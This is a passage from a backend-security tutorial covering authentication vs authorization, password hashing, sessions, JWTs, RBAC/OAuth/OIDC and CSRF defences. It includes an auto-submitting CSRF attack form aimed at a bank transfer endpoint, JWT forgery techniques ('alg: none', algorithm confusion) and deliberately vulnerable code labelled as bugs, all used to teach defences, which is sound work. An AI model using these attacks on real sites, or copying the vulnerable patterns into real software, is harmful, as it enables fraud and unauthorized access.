# Phase 8 — Authentication, Authorization and Security

> Part of the *Zero to Expert Backend Engineering Master Roadmap*
> Prerequisites: Phase 5 (Express), Phase 6 (MySQL and SQL), Phase 7 (ORM and Data Access)
> Stack assumed: **Node.js + TypeScript + Express + MySQL**

---

## How to Read This Phase

Every topic follows the roadmap's 12-step order:

1. Proper definition
2. Simple meaning
3. Why it is needed
4. How it works internally
5. Syntax and API
6. Small example
7. Real backend usage
8. Edge cases
9. Common mistakes
10. Interview answer
11. Practice problem
12. Production considerations

Priority legend:

| Tag | Meaning |
|---|---|
| **MUST KNOW** | Required for backend development and interviews |
| **IMPORTANT** | Strongly recommended for professional work |
| **GOOD TO KNOW** | Useful after the core is clear |
| **SKIP FOR NOW** | Learn later when the role requires it |

### Phase 8 priority summary

The roadmap lists this entire phase as **MUST KNOW**, and it means it. Security is not a layer you add later — a backend that gets authentication or authorization wrong does not have a bug, it has a breach waiting for a date.

### The governing rule of this phase

> **Never trust the client. Never invent your own cryptography. Fail closed, not open.**
>
> Every vulnerability in this phase reduces to one of three things: trusting input that came from outside your control, using a home-grown scheme where a standard one exists, or a code path that grants access when it should have denied it. Read every section below with that lens.

---

## 8.1 Authentication vs Authorization

**Priority: MUST KNOW**

### Definition

**Authentication (AuthN)** verifies *who* a caller is. **Authorization (AuthZ)** determines *what* an authenticated caller is allowed to do.

### Simple meaning

Authentication is the ID check at the door. Authorization is the badge that decides which floors the elevator will take you to.

### Why it is needed

They are frequently conflated, and the conflation causes real bugs: an endpoint that checks "is there a valid token" (authentication) but forgets to check "does this token's owner have permission for this resource" (authorization) is the single most common access-control vulnerability in web APIs — the **Broken Object-Level Authorization (BOLA)** class, consistently #1 in the OWASP API Security Top 10.

### How it works internally

```
Request → [Authentication middleware]  → attaches req.user (who)
        → [Authorization check]        → decides allow/deny for THIS action on THIS resource
        → Handler
```

Authentication typically happens once per request, near the top of the middleware chain. Authorization must happen **per resource, per action** — often inside the handler itself, because only the handler knows which specific row is being touched.

### Small example — the bug, made concrete

```ts
// Authenticates, but never authorizes against the resource — BOLA
app.get('/orders/:id', requireAuth, async (req, res) => {
  const order = await orderRepo.findById(req.params.id);
  res.json(order);              // any logged-in user can read ANY order by guessing IDs
});

// Correct: authorization scoped to the resource
app.get('/orders/:id', requireAuth, async (req, res) => {
  const order = await orderRepo.findById(req.params.id);
  if (!order || order.userId !== req.user.id) {
    return res.status(404).json({ error: 'not_found' });   // 404, not 403 — don't confirm existence
  }
  res.json(order);
});
```

### Real backend usage

- Authentication: login, session/token verification, "is this API key valid".
- Authorization: "can this user cancel this order", "can this role access the admin panel", "can this tenant see this row" (Phase 6, §6.3's `tenant_id` scoping is an authorization control, not just a data-modeling one).

### Edge cases

- A valid, authenticated user is not automatically authorized for everything — including their own past self in a different role after a demotion.
- Returning 403 vs 404 leaks information — deciding which to return is itself a security decision (§8.11).
- Authorization must be re-checked on every request; caching "user X can access resource Y" across requests without invalidation on permission change is a stale-privilege bug.

### Common mistakes

1. Checking only that a token is valid, not that its owner owns the resource.
2. Doing authorization in the frontend only.
3. Trusting a client-supplied `userId` in the request body instead of the one derived from the verified token.
4. Forgetting authorization on secondary actions (view is checked, delete is not).

### Interview answer

> "Authentication answers who you are; authorization answers what you're allowed to do. The mistake I watch for is doing authentication at the top of the middleware chain and assuming that's enough — object-level authorization has to happen per resource, inside the handler, because that's the only place that knows which row is being accessed. That gap is exactly what OWASP calls broken object-level authorization, and it's the most common API vulnerability in practice."

**Frequently asked:** Difference between 401 and 403? · What is BOLA and how do you prevent it? · Where does authorization belong in the request pipeline?

### Practice problem

Take an existing `GET/PUT/DELETE /orders/:id` set of endpoints and add object-level authorization to all three, returning 404 for both "not found" and "not yours". Write a test asserting user B cannot access user A's order by ID guessing.

### Production considerations

- Authorization checks belong in the service layer (Phase 7, §7.5), not scattered across controllers, so they cannot be forgotten on a new route.
- Log authorization denials distinctly from authentication failures — a spike in denials against sequential IDs is a BOLA probe.

---

## 8.2 Password Hashing

**Priority: MUST KNOW**

### Definition

Password hashing transforms a plaintext password into a one-way, salted, computationally expensive digest, so that even a full database leak does not directly reveal usable passwords.

### Simple meaning

You never store the password. You store proof that you once saw it, in a form that is deliberately, tunably slow to reverse.

### Why it is needed

Password databases leak — constantly, across the entire industry. The hashing algorithm is the only thing standing between a leak and every user's password (and, because of reuse, their accounts elsewhere) being exposed. This is why "we hash passwords" is not enough; *how* you hash them is the whole question.

### How it works internally

**Never use a fast general-purpose hash** (MD5, SHA-1, SHA-256) for passwords. They are fast by design — good for checksums, catastrophic for passwords, because an attacker with a leaked hash database can try billions of guesses per second on commodity GPUs.

Password hashing functions are deliberately slow and **memory-hard**, so GPU/ASIC parallelism does not help the attacker:

| Algorithm | Type | Status |
|---|---|---|
| **bcrypt** | Blowfish-based, tunable cost factor | Solid, battle-tested, widely deployed default |
| **argon2id** | Memory-hard, hybrid resistance | **Current best practice** (winner of the Password Hashing Competition) |
| scrypt | Memory-hard | Good; less common in Node ecosystems than argon2 |
| PBKDF2 | Iterated HMAC | Acceptable, weaker memory-hardness than argon2/scrypt |

Every one of these includes a **per-password random salt** automatically, folded into the output string. Salting defeats rainbow tables (precomputed hash lookup tables) by ensuring two users with the same password get different hashes.

### Syntax and API

```ts
import argon2 from 'argon2';

// Hashing — cost parameters tuned to your hardware; measure, don't guess
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 19_456,   // ~19 MB
  timeCost: 2,
  parallelism: 1,
});
// hash looks like: $argon2id$v=19$m=19456,t=2,p=1$<salt>$<digest>  — salt and params are embedded

// Verification
const valid = await argon2.verify(hash, candidatePassword);
```

```ts
import bcrypt from 'bcrypt';

const hash = await bcrypt.hash(password, 12);      // cost factor 12 — tune to ~100-250ms per hash
const valid = await bcrypt.compare(candidatePassword, hash);
```

### Small example — registration and login

```ts
async function register(email: string, password: string) {
  assertPasswordPolicy(password);                         // length/strength, not composition rules
  const passwordHash = await argon2.hash(password, ARGON2_OPTS);
  return userRepo.create({ email: email.toLowerCase(), passwordHash });
}

async function login(email: string, password: string) {
  const user = await userRepo.findByEmail(email.toLowerCase());
  const dummyHash = '$argon2id$v=19$m=19456,t=2,p=1$c29tZXNhbHQ$c29tZWhhc2g';

  // ALWAYS run verify, even if the user doesn't exist — constant-time behaviour
  const ok = await argon2.verify(user?.passwordHash ?? dummyHash, password);
  if (!user || !ok) throw new InvalidCredentialsError();   // same error, same shape either way

  if (await argon2.needsRehash(user.passwordHash, ARGON2_OPTS)) {
    await userRepo.updatePasswordHash(user.id, await argon2.hash(password, ARGON2_OPTS));
  }
  return issueSession(user);
}
```

The dummy-hash trick and the identical error for "no such user" and "wrong password" both close a **user-enumeration** timing/response side channel (§8.11 relates this to broader response-shape leaks).

### Real backend usage

- Every credential-based login flow.
- Rehashing on login when cost parameters are upgraded (`needsRehash`) — this is how you migrate an entire user base to stronger parameters without a forced password reset.
- API key storage: hash the key itself (a fast HMAC-SHA256 is acceptable here because API keys are high-entropy random strings, not human-guessable passwords — see the distinction in §8.11's secrets section).

### Edge cases

- Passwords longer than bcrypt's 72-byte input limit are silently truncated — validate a maximum length or use argon2, which has no such limit.
- Never truncate, trim, or "normalize" a password before hashing beyond Unicode normalization decided once and applied consistently.
- Comparing hashes with `===` is fine — the library's `verify`/`compare` does the constant-time comparison of the *derived* digest; you never compare raw hash strings yourself with manual logic.
- Migrating from bcrypt to argon2: hash algorithm is embedded in the stored string, so verification can dispatch on prefix and rehash on successful login.
- Rate limiting login attempts (§8.9) is not optional — even argon2id does not make online guessing free if there is no attempt limit.

### Common mistakes

1. MD5/SHA-256 for passwords.
2. Home-rolled "hashing" (e.g., hash + reverse + hash).
3. A fixed, hardcoded salt or no salt (the library handles this — do not override it).
4. Different error messages/timing for "user not found" vs "wrong password".
5. No length cap, allowing multi-megabyte input into the hash function (a DoS vector).
6. Storing the plaintext password anywhere — logs, error messages, "temporary" debug output.
7. Forgetting to rehash after a cost-parameter upgrade, leaving old users under-protected forever.

### Interview answer

> "I hash passwords with argon2id, which is memory-hard so GPU parallelism doesn't help an attacker, and it embeds a random per-password salt and its cost parameters in the stored string. I never use a fast hash like SHA-256 for this — fast is exactly the wrong property for a password hash. On login I always run the verify call even when the user doesn't exist, comparing against a dummy hash, so the response time and error message don't leak whether an account exists. I also check `needsRehash` on successful login so I can raise cost parameters over time without forcing a password reset."

**Frequently asked:** Why not SHA-256 for passwords? · bcrypt vs argon2? · What is a salt and why does it matter? · How do you upgrade hashing cost parameters for existing users? · How do you prevent user enumeration at login?

### Practice problem

Implement register/login with argon2id, the dummy-hash constant-response pattern, and automatic rehashing. Write a test that measures response time for "wrong password" vs "no such user" and asserts they are statistically indistinguishable.

### Production considerations

- Tune cost parameters against your actual hardware, targeting roughly 100–300 ms per hash — expensive enough to slow attackers, cheap enough not to bottleneck login traffic.
- Never log passwords, even at debug level; scrub them in request-logging middleware before they reach any logger.
- Pair with rate limiting and account lockout/backoff (§8.9) — hashing strength and attempt limiting are complementary, not substitutes for each other.

---

## 8.3 Sessions

**Priority: MUST KNOW**

### Definition

A session is server-side state, keyed by an opaque identifier stored in the client (typically a cookie), that lets the server recognize a returning authenticated user across requests.

### Simple meaning

The server remembers you by a random ticket number it handed you; it looks up who you are by that number on every request.

### Why it is needed

HTTP is stateless. Something has to bridge "the user who logged in five minutes ago" to "the request arriving right now." Sessions are the traditional, still entirely valid answer — and for many applications (server-rendered apps, first-party web apps) they remain simpler and safer than tokens.

### How it works internally

```
Login succeeds
  → server generates a random, high-entropy session ID
  → server stores { sessionId → { userId, createdAt, ... } } in a session store
  → server sets a cookie: Set-Cookie: sid=<sessionId>; HttpOnly; Secure; SameSite=Lax
Subsequent request
  → browser automatically sends the cookie
  → server looks up sessionId in the store → attaches req.user
Logout / expiry
  → server deletes the session record → the cookie becomes meaningless
```

The critical property: **the session ID is opaque and meaningless outside the server's store.** Revocation is trivial — delete the row, and the session is dead everywhere, instantly. This is sessions' central advantage over JWTs (§8.4).

### Syntax and API

```ts
import session from 'express-session';
import { RedisStore } from 'connect-redis';

app.use(session({
  store: new RedisStore({ client: redisClient, prefix: 'sess:' }),
  secret: process.env.SESSION_SECRET!,          // signs the cookie, not the data
  name: 'sid',
  resave: false,
  saveUninitialized: false,
  rolling: true,                                 // refresh expiry on activity
  cookie: {
    httpOnly: true,
    secure: true,                                // HTTPS only
    sameSite: 'lax',
    maxAge: 30 * 60 * 1000,                       // 30 minutes idle timeout
  },
}));

app.post('/login', async (req, res) => {
  const user = await authenticate(req.body.email, req.body.password);
  req.session.regenerate((err) => {               // NEW session ID on privilege change
    if (err) return res.status(500).end();
    req.session.userId = user.id;
    res.json({ ok: true });
  });
});

app.post('/logout', (req, res) => {
  req.session.destroy(() => res.clearCookie('sid').json({ ok: true }));
});
```

**Never use the default `MemoryStore`** in production — it leaks memory, does not scale across processes, and loses all sessions on restart. Use Redis, MySQL, or another shared, persistent store.

### Small example — session fixation defence

```ts
// WRONG: reuses the pre-login session ID for the authenticated session
req.session.userId = user.id;

// RIGHT: issue a brand-new session ID at the moment of privilege escalation
req.session.regenerate((err) => {
  req.session.userId = user.id;
});
```

If an attacker can set a victim's session ID before login (session fixation), regenerating on login invalidates the attacker's known ID.

### Real backend usage

- Traditional server-rendered web apps, admin dashboards, first-party SPAs served from the same origin as the API.
- Anywhere instant, centralized revocation matters (a "log out everywhere" or "force logout on password change" feature).

### Edge cases

- Sticky sessions vs a shared store: without a shared store, load-balanced instances each hold different session data — always centralize.
- Session ID entropy must be cryptographically random (the library handles this; never roll your own ID generator).
- `SameSite=Strict` breaks some cross-site navigation flows (e.g., arriving via an external link while logged in); `Lax` is the common default balance.
- Idle timeout vs absolute timeout are different controls — a `rolling` cookie only bounds idle time, not total session lifetime; add an absolute cap for sensitive apps.

### Common mistakes

1. `MemoryStore` in production.
2. Not regenerating the session ID on login (fixation).
3. Missing `HttpOnly` (allows JS/XSS to read the cookie) or `Secure` (allows transmission over plain HTTP).
4. Storing sensitive data (password, full profile) inside the session payload instead of just an ID reference.
5. No server-side expiry, relying only on the cookie's `maxAge` (which the client controls the presentation of, though not the actual expiry check — always re-validate server-side).

### Interview answer

> "A session is server-side state keyed by an opaque ID the client holds in a cookie. Its biggest advantage over a JWT is that revocation is instant and centralized — I delete the row in the store and the session is dead everywhere, which matters for 'log out everywhere' or forcing logout after a password change. I always regenerate the session ID at login to prevent fixation, use a shared store like Redis rather than in-memory, and set HttpOnly, Secure and SameSite on the cookie so it can't be read by JavaScript or leaked over plaintext HTTP."

**Frequently asked:** How do sessions work end to end? · Why not the default MemoryStore? · What is session fixation and how do you prevent it? · Sessions vs JWTs — when would you choose sessions?

### Practice problem

Implement session-based auth with Redis, session regeneration on login, `req.session.destroy` on logout, and a "log out everywhere" endpoint that deletes all of a user's sessions from the store by scanning a `userId → sessionIds` index.

### Production considerations

- Use a shared, persistent, monitored session store; treat its availability as part of your auth system's SLA.
- Set both idle and absolute expiry for anything handling sensitive data.
- Rotate `SESSION_SECRET` deliberately (it only signs the cookie, so rotation invalidates outstanding cookies — plan for that).

---

## 8.4 JWT (JSON Web Tokens)

**Priority: MUST KNOW**

### Definition

A JWT is a compact, self-contained, digitally signed token encoding a set of claims (data about the subject and the token itself), verifiable without a server-side lookup.

### Simple meaning

A tamper-evident ID card the server hands you that carries its own facts and its own signature, so any server that trusts the signing key can verify it without calling home.

### Why it is needed

Stateless verification is valuable for distributed systems, microservices, and mobile/native clients where cookies are awkward. A JWT lets any service verify a caller's identity without a shared session store or a network call to an auth service.

### How it works internally

```
header.payload.signature
   base64url(JSON)  .  base64url(JSON)  .  base64url(HMAC or RSA/EC signature over "header.payload")
```

```json
// header
{ "alg": "HS256", "typ": "JWT" }
// payload (claims) — NOT encrypted, just base64url-encoded. Anyone can read it.
{ "sub": "42", "role": "admin", "iat": 1732000000, "exp": 1732003600 }
```

Verification recomputes the signature over the header and payload using the known key and compares it to the token's signature. If they match, the payload has not been altered since signing. **The payload is visible to anyone holding the token — never put secrets in it.**

**Algorithm choice matters enormously:**

| Type | Algorithm | Key model |
|---|---|---|
| Symmetric | HS256 | One shared secret signs *and* verifies — any verifier can also forge tokens |
| Asymmetric | RS256 / ES256 | Private key signs, public key verifies — verifiers cannot forge tokens |

Use **RS256/ES256** whenever multiple services verify tokens but only one (the auth service) should be able to issue them. HS256 is fine for a single-service, single-secret setup, but the secret must then be tightly held — anyone with it can mint valid tokens for any user.

### Syntax and API

```ts
import jwt from 'jsonwebtoken';

// Signing (auth service)
const accessToken = jwt.sign(
  { sub: user.id, role: user.role },
  privateKey,
  { algorithm: 'RS256', expiresIn: '15m', issuer: 'api.example.com', audience: 'example-clients' }
);

// Verifying (any service)
try {
  const claims = jwt.verify(token, publicKey, {
    algorithms: ['RS256'],          // ALWAYS pin the algorithm explicitly
    issuer: 'api.example.com',
    audience: 'example-clients',
  });
} catch (err) {
  if (err instanceof jwt.TokenExpiredError) throw new UnauthorizedError('expired');
  throw new UnauthorizedError('invalid');
}
```

### The `alg: none` attack — the canonical JWT vulnerability

```ts
// VULNERABLE: trusts the algorithm named IN the token
const claims = jwt.verify(token, key);   // no algorithms option

// An attacker crafts a token with header {"alg":"none"} and no signature.
// A naive verifier that reads alg from the token itself may accept it as valid.
```

**Always pass `algorithms: [...]` explicitly to pin the accepted algorithm(s).** Never let the verification code decide its algorithm from the untrusted token. This single line is the fix for one of the most-cited real-world JWT library vulnerabilities, and interviewers ask about it directly.

A related variant: an RS256-signing system where the verifier is misconfigured to also accept HS256, and the *public* key (which is not secret) is fed in as the HMAC secret — letting an attacker sign their own token with the public key as if it were an HS256 secret. Pinning `algorithms: ['RS256']` closes this too.

### Access tokens vs refresh tokens

```
Access token  — short-lived (5–15 min), sent on every API request, stateless verification
Refresh token — long-lived (days-weeks), used ONLY to obtain a new access token, stored more carefully
```

```ts
app.post('/token/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;             // HttpOnly cookie, not JS-readable
  const record = await refreshTokenRepo.findValid(refreshToken);  // hashed lookup, see below
  if (!record) return res.status(401).json({ error: 'invalid_refresh_token' });

  await refreshTokenRepo.revoke(record.id);                  // rotate: old one is now dead
  const newRefreshToken = await refreshTokenRepo.issue(record.userId);
  const accessToken = signAccessToken(record.userId);

  res.cookie('refreshToken', newRefreshToken, REFRESH_COOKIE_OPTS);
  res.json({ accessToken });
});
```

**Refresh token rotation with reuse detection:** each refresh token can be used exactly once. If a *revoked* (already-used) refresh token is presented again, that is strong evidence of theft — a copy is being used somewhere the legitimate user is not — and the correct response is to revoke the **entire token family** (every token descended from that chain), forcing full re-authentication.

```ts
async function handleRefresh(presentedToken: string) {
  const record = await refreshTokenRepo.findByToken(presentedToken);
  if (!record) throw new UnauthorizedError();

  if (record.revokedAt) {
    await refreshTokenRepo.revokeFamily(record.familyId);    // reuse detected → nuke the chain
    throw new SecurityError('refresh_token_reuse_detected');
  }
  // ... normal rotation
}
```

Store refresh tokens **hashed** (like passwords, but a fast hash like SHA-256 suffices since they are already high-entropy random values, not human-chosen) — a database leak should not hand out usable refresh tokens.

### Real backend usage

- Mobile and SPA clients calling an API, especially across multiple backend services that all need to verify identity independently.
- Service-to-service auth in a microservice architecture (often via a short-lived token issued by an internal auth service, verified with a shared public key or JWKS endpoint).
- OAuth 2.0 and OIDC (§8.5) use JWTs as the standard token format.

### Edge cases

- `exp` must be checked (libraries do this by default — do not disable it).
- Clock skew between issuer and verifier can cause false expiry/not-yet-valid errors; small `clockTolerance` settings exist for this.
- A JWT cannot be revoked before its natural expiry without extra infrastructure (a denylist, or short expiry + refresh rotation) — this is the core trade-off against sessions.
- Payload size: JWTs are sent on every request (often as a header), so bloated claims cost bandwidth on every call.
- Storing a JWT in `localStorage` exposes it to any XSS on the page (§8.7) — prefer an in-memory variable for the access token and an `HttpOnly` cookie for the refresh token.

### Common mistakes

1. Not pinning `algorithms` on verify — the `alg: none` / algorithm-confusion class of bugs.
2. Putting sensitive data (password hash, full PII) in the payload — it is only signed, not encrypted, and trivially decodable by anyone.
3. Long-lived access tokens with no revocation story.
4. Storing tokens in `localStorage` and calling it done, ignoring XSS exposure.
5. No refresh-token rotation, so a stolen refresh token remains valid indefinitely.
6. Trusting claims like `role` in the JWT for authorization decisions that changed *after* the token was issued (a demoted admin's still-valid token still says `role: admin` until it expires).

### Interview answer

> "A JWT is a signed, self-contained token — header, payload and signature, all base64url-encoded, and the payload is readable by anyone who has the token even though it can't be modified without invalidating the signature. The detail I always mention is pinning the algorithm explicitly on verification, because trusting the algorithm named inside the token is how `alg: none` and algorithm-confusion attacks work.
>
> I use short-lived access tokens — five to fifteen minutes — for stateless verification, paired with a longer-lived refresh token that's rotated on every use and stored hashed. If a refresh token that's already been used shows up again, that's reuse — evidence of theft — so I revoke the whole token family rather than just that token, and force re-authentication. The fundamental trade-off against sessions is that a JWT can't be revoked before it expires without extra infrastructure, which is exactly why the access token stays short-lived."

**Frequently asked:** How does JWT verification work? · What is the `alg: none` attack and how do you prevent it? · Access vs refresh tokens? · How do you revoke a JWT? · HS256 vs RS256 — when does it matter? · Where do you store a JWT on the client and why?

### Practice problem

Implement RS256 access + refresh token auth with rotation and reuse detection. Write a test that: logs in, refreshes once (should succeed), then replays the *original* (now-revoked) refresh token and asserts the entire token family is revoked and a subsequent legitimate refresh also fails.

### Production considerations

- Rotate signing keys periodically; support key rotation via a `kid` header and a JWKS endpoint so old tokens remain verifiable during the overlap window.
- Keep access token TTL short enough that a leaked token self-expires quickly; tune against your threat model.
- Monitor refresh-token-reuse events as a security signal, not just a bug.
- Never accept a JWT whose issuer/audience doesn't match what you expect — pin both, not just the signature.

---

## 8.5 RBAC, ABAC, MFA, OAuth 2.0 and OpenID Connect

**Priority: MUST KNOW**

### RBAC (Role-Based Access Control)

**Definition.** Permissions are attached to roles; users are assigned roles; a user's effective permissions are the union of their roles' permissions.

**Why.** Managing permissions per-user does not scale past a handful of users. Roles let you reason about "what can an editor do" once, independent of who currently holds that role.

```sql
-- Schema shape (Phase 6, §6.3 many-to-many pattern)
roles(id, name)
permissions(id, name)              -- e.g. 'orders:read', 'orders:refund'
role_permissions(role_id, permission_id)
user_roles(user_id, role_id)
```

```ts
async function can(userId: string, permission: string): Promise<boolean> {
  const rows = await db.query(
    `SELECT 1 FROM user_roles ur
     JOIN role_permissions rp ON rp.role_id = ur.role_id
     JOIN permissions p ON p.id = rp.permission_id
     WHERE ur.user_id = ? AND p.name = ? LIMIT 1`,
    [userId, permission]
  );
  return rows.length > 0;
}

app.delete('/orders/:id', requireAuth, async (req, res) => {
  if (!(await can(req.user.id, 'orders:refund'))) {
    return res.status(403).json({ error: 'forbidden' });
  }
  // ...
});
```

Cache permission lookups per request (not across requests) to avoid a query per check; invalidate any cross-request cache immediately on role change.

### ABAC (Attribute-Based Access Control)

**Definition.** Access decisions are computed from attributes of the user, the resource, the action, and the environment, via policy rules — rather than a fixed role name.

**Why.** RBAC struggles with "an editor can edit articles they authored, but not others' articles" or "a manager can approve expenses under $1,000 but not over." These are attribute relationships, not role memberships.

```ts
// Policy as code — the ABAC idea, without necessarily needing a dedicated engine
function canApproveExpense(user: User, expense: Expense): boolean {
  if (user.department !== expense.department) return false;
  if (expense.amount > user.approvalLimit) return false;
  if (expense.submittedBy === user.id) return false;   // no self-approval
  return true;
}
```

RBAC and ABAC are not exclusive — most real systems use RBAC for coarse gating ("is this an admin route at all") and ABAC-style resource checks for fine-grained, per-object decisions (which is also exactly what closes the BOLA gap from §8.1).

### Multi-Factor Authentication (concepts)

**Definition.** Requiring two or more independent proof factors — something you know (password), something you have (a device/token), something you are (biometric) — before granting access.

**TOTP (Time-based One-Time Password)** is the common self-hosted MFA mechanism:

```ts
import { authenticator } from 'otplib';

const secret = authenticator.generateSecret();               // store encrypted, per user
const otpauthUrl = authenticator.keyuri(user.email, 'MyApp', secret);  // render as a QR code

// Verifying a 6-digit code the user types from their authenticator app
const valid = authenticator.verify({ token: userInput, secret });
```

Key points: the secret is shared once (via QR code) and never transmitted again; codes are derived from the secret plus the current time, with a small tolerance window for clock drift; **always provide backup/recovery codes**, generated once, hashed like passwords, single-use.

### OAuth 2.0 (concepts)

**Definition.** OAuth 2.0 is an **authorization** delegation framework — it lets a user grant a third-party application limited access to their resources on another service, without sharing their password with that application.

**Simple meaning.** "Sign in with Google" is not really about *identity* in the base spec — it's about a token that proves "this app is allowed to act on this user's behalf, for these specific scopes."

**The Authorization Code flow (the one to know):**

```
1. App redirects user to the provider's /authorize endpoint with client_id, redirect_uri,
   scope, state, and (for public clients) a PKCE code_challenge.
2. User authenticates with the provider and approves the requested scopes.
3. Provider redirects back to redirect_uri with a short-lived authorization `code` and `state`.
4. App's backend exchanges the code (+ PKCE code_verifier) at the provider's /token endpoint
   for an access_token (and, for OIDC, an id_token).
5. App uses the access_token to call the provider's APIs on the user's behalf.
```

**PKCE (Proof Key for Code Exchange)** is mandatory in modern practice even for confidential clients — it binds the code exchange to the same party that started the flow, closing an authorization-code interception attack. Always verify the `state` parameter to prevent CSRF against the OAuth flow itself.

### OpenID Connect (OIDC)

**Definition.** OIDC is an identity layer built on top of OAuth 2.0, adding a standardized `id_token` (a JWT) that asserts *who the user is*, alongside OAuth's access token for *what the app can do*.

**The distinction that gets asked constantly:** OAuth 2.0 answers "can this app access this resource"; OIDC answers "who is this user." "Sign in with Google" is OIDC (using OAuth's plumbing underneath) — you consume the `id_token`'s claims (`sub`, `email`, `email_verified`) to establish identity in your own system, then issue your own session or JWT rather than trusting the third party's token forever.

```ts
// Verifying an OIDC id_token — never trust it unverified
const claims = jwt.verify(idToken, googlePublicKey, {
  algorithms: ['RS256'],
  audience: GOOGLE_CLIENT_ID,
  issuer: 'https://accounts.google.com',
});
if (!claims.email_verified) throw new Error('unverified email');
```

### Real backend usage

- RBAC for admin panels, staff tooling, coarse route gating.
- ABAC-style checks for "owns this resource," "within budget," "same tenant."
- MFA on sensitive account actions (login from a new device, changing payment details).
- OAuth/OIDC for "sign in with Google/GitHub" and for granting third-party integrations limited API access.

### Edge cases

- A role change must invalidate any cached permission state and, ideally, force re-authentication or at least re-authorization on the next sensitive action — a still-valid JWT with a stale `role` claim is a real gap (§8.4).
- OAuth `redirect_uri` must be an exact allowlisted match — open redirect here is a well-known exploitation path.
- ABAC policies can become complex enough to need a dedicated engine (OPA, Cedar) at scale; know when hand-written policy functions stop being enough.

### Common mistakes

1. Doing authorization entirely in role names when the real rule is attribute-based ("only the author can edit").
2. Skipping `state`/PKCE validation in an OAuth flow.
3. Trusting a third-party `id_token`'s claims without verifying signature, issuer and audience.
4. No backup codes for MFA, locking users out permanently on device loss.
5. Treating "logged in via Google" as authorization to do anything beyond establishing identity.

### Interview answer

> "RBAC attaches permissions to roles and roles to users — good for coarse checks like 'is this an admin route.' ABAC evaluates attributes of the user, resource and action for finer rules like 'only the author can edit this post,' and most real systems combine both. OAuth 2.0 is about delegated authorization — a token that lets an app act on a user's behalf for specific scopes — while OpenID Connect layers identity on top of it with a signed id_token; the way I remember the split is OAuth answers 'what can this app do,' OIDC answers 'who is this user.' Whatever the third party asserts, I verify the id_token's signature, issuer and audience myself rather than trusting it blindly, and then issue my own session or token rather than depending on the provider's token for every subsequent request."

**Frequently asked:** RBAC vs ABAC? · OAuth vs OIDC — what's the actual difference? · What is PKCE and why does it matter? · How does TOTP work? · Why verify `state` in an OAuth callback?

### Practice problem

Implement RBAC with roles/permissions tables and a `can()` check, plus one ABAC-style rule ("only the resource owner or an admin may delete it"). Then implement "Sign in with Google" using the authorization code flow with PKCE, verifying the `id_token` before creating a local session.

### Production considerations

- Store role/permission assignments so changes take effect promptly — avoid long-lived caches of authorization decisions.
- Allowlist OAuth redirect URIs exactly; never wildcard them.
- Audit-log every role change and every MFA enrollment/disable event (§8.12).

---

## 8.6 CSRF (Cross-Site Request Forgery)

**Priority: MUST KNOW**

### Definition

CSRF tricks an authenticated user's browser into submitting a request to your application that the user did not intend, by exploiting the browser's automatic inclusion of cookies on requests to the cookie's origin.

### Simple meaning

You're logged into your bank in one tab. A malicious page in another tab silently submits a form to your bank's "transfer money" endpoint. Your browser happily attaches your bank's session cookie, because that's just how cookies work — the malicious site never sees the cookie, but the request still carries your authority.

### Why it is needed

Any cookie-authenticated, state-changing endpoint is a target unless explicitly protected. It is a classic, still-common vulnerability class precisely because the browser's cookie behavior is a feature everywhere except here.

### How it works internally

```html
<!-- Hosted on evil.example — the victim just needs to visit this page while logged into your-bank -->
<form action="https://your-bank.example/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

The browser sends the request to `your-bank.example` with the victim's session cookie attached, because cookies are sent based on the *destination* origin, not the *origin the request came from*.

### Defenses

**1. `SameSite` cookies — the modern first line of defense.**

```ts
res.cookie('sid', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',    // cookie NOT sent on cross-site POST/PUT/DELETE requests
});
```

`SameSite=Lax` (the modern browser default) blocks the cookie from being attached on cross-site state-changing requests while still allowing it on top-level navigation (so following a link still works). `Strict` is even tighter but breaks some legitimate cross-site link flows. This alone neutralizes the classic form-based CSRF above in modern browsers.

**2. CSRF tokens — defense in depth, still recommended for cookie-authenticated state-changing routes.**

```ts
import csurf from 'csurf';                 // or a modern equivalent; concept matters more than the exact lib
app.use(csurf({ cookie: true }));

app.get('/form', (req, res) => res.render('form', { csrfToken: req.csrfToken() }));

app.post('/transfer', (req, res) => {
  // middleware validates the submitted token against the session-tied token automatically;
  // requests without a matching token are rejected before the handler runs
});
```

The token is unpredictable, tied to the user's session, and must be included in the request (as a hidden form field or a custom header) — something a cross-site attacker's form cannot know or forge, because it cannot read your page or your cookies (same-origin policy prevents that read, even though the cookie *send* is unrestricted).

**3. Custom headers for API/AJAX requests.**

```ts
// A cross-site <form> submission cannot set custom headers.
// Requiring one is a lightweight, effective CSRF defense for JSON APIs.
fetch('/api/orders', { method: 'POST', headers: { 'X-Requested-With': 'XMLHttpRequest' }, ... });

app.post('/api/orders', (req, res) => {
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') return res.status(403).end();
  // ...
});
```

**A crucial scoping note:** CSRF is fundamentally a **cookie-authentication** problem. An API that authenticates purely via a bearer token in an `Authorization` header (not a cookie) is not vulnerable to classic CSRF, because a cross-site form cannot set custom headers or read the token to attach it. This is one reason token-header auth is popular for pure APIs — but the moment you also use a cookie for anything (including a refresh token cookie, §8.4), that cookie-bearing endpoint is back in scope.

### Real backend usage

- Any server-rendered form submission relying on session cookies.
- Any JSON API where the access token or session is carried via cookie rather than an explicit header.

### Edge cases

- GET requests should never have side effects — CSRF (and plain browser prefetching/link-crawling) can trigger them accidentally. Keep GET idempotent and side-effect-free (an HTTP semantics rule that doubles as a security control).
- `SameSite=Lax` still allows the cookie on top-level GET navigations, so a state-changing GET is still exploitable — another reason GET must never mutate state.
- Embedded contexts (iframes) and some legacy browsers complicate `SameSite` reliability — token-based defense in depth still matters.

### Common mistakes

1. Relying solely on `SameSite` for a sensitive app without a CSRF token as defense in depth.
2. State-changing `GET` endpoints.
3. Assuming a pure `Authorization`-header bearer-token API needs CSRF tokens (it generally does not, but re-check anytime a cookie is introduced).
4. CORS misconfiguration (§8.8) mistakenly treated as a CSRF fix — they are different problems.

### Interview answer

